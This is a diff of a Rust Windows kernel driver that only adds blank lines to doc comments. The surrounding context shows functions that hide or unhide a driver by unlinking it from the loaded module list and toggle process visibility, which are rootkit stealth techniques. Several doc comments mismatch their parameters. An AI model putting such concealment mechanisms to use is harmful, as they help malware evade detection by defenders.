@@ -28,9 +28,11 @@ impl Driver {
     /// Toggle the visibility of a process based on the `enable` field of the `TargetProcess` structure.
     ///
     /// # Parameters
+    /// 
     /// - `process`:  A pointer to the `TargetProcess` structure.
     ///
     /// # Returns
+    /// 
     /// - `NTSTATUS`: A status code indicating success or failure of the operation.
     ///
     pub unsafe fn driver_toggle(driver: *mut TargetDriver) -> NTSTATUS {
@@ -45,9 +47,11 @@ impl Driver {
     /// Hides the driver by unlinking it from the loaded module list.
     ///
     /// # Parameters
+    /// 
     /// - `device`: A pointer to the `DEVICE_OBJECT` representing the driver to be hidden.
     ///
     /// # Returns
+    /// 
     /// - `NTSTATUS`: A status code indicating success (`STATUS_SUCCESS`) or failure of the operation.
     ///
     unsafe fn hide_driver(driver_name: &String) -> NTSTATUS {
@@ -102,9 +106,11 @@ impl Driver {
     /// Hides the driver by unlinking it from the loaded module list.
     ///
     /// # Parameters
+    /// 
     /// - `device`: A pointer to the `DEVICE_OBJECT` representing the driver to be hidden.
     ///
     /// # Returns
+    /// 
     /// - `NTSTATUS`: A status code indicating success (`STATUS_SUCCESS`) or failure of the operation.
     ///
     unsafe fn unhide_driver(driver_name: &str) -> NTSTATUS {
